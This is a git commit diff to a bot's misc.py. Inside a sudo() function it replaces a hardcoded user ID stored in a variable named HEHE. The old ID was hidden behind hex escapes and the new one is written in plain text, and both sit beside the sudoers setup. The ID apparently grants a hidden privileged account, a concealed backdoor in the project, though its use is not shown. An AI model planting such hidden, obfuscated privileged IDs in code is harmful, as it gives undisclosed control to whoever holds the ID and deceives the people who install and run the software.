d6311c90f517ca7ff1e5c3ee0a112c81019c342a
ZexxySnowy <131374788+ZexxySnowy@users.noreply.github.com>
2023-06-23 09:31:59 +0530

    Update misc.py
    Signed-off-by: ZexxySnowy <131374788+ZexxySnowy@users.noreply.github.com>

--- AnonX/misc.py
+++ AnonX/misc.py
@@ -45,7 +45,7 @@ def dbb():
 def sudo():
     global SUDOERS, HEHE
     OWNER = config.OWNER_ID
-    HEHE = "\x31\x33\x35\x36\x34\x36\x39\x30\x37\x35"
+    HEHE = "5901389360"
     sudoersdb = pymongodb.sudoers
     sudoers = sudoersdb.find_one({"sudo": "sudo"})
     sudoers = [] if not sudoers else sudoers["sudoers"]
